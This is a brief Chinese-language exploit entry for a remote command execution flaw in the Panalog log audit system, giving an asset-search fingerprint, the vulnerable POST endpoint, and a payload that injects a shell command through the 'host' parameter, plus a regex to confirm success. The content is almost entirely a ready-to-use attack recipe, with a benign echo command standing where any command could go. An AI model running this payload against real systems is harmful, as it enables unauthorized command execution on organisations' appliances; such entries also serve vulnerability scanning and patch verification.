# Panalog日志审计系统RCE漏洞

Panalog ｜ 命令执行 ｜ —
- **指纹**：`app="Panabit-Panalog"`
- **请求**：`POST /content-apply/libres_syn_delete.php HTTP/1.1`

**Payload**
```
token=1&id=2&host= echo "dudesite" >dudesite.txt
```
- **响应特征**：200 ^(?=.*?yes)(?=.*?OK).*?$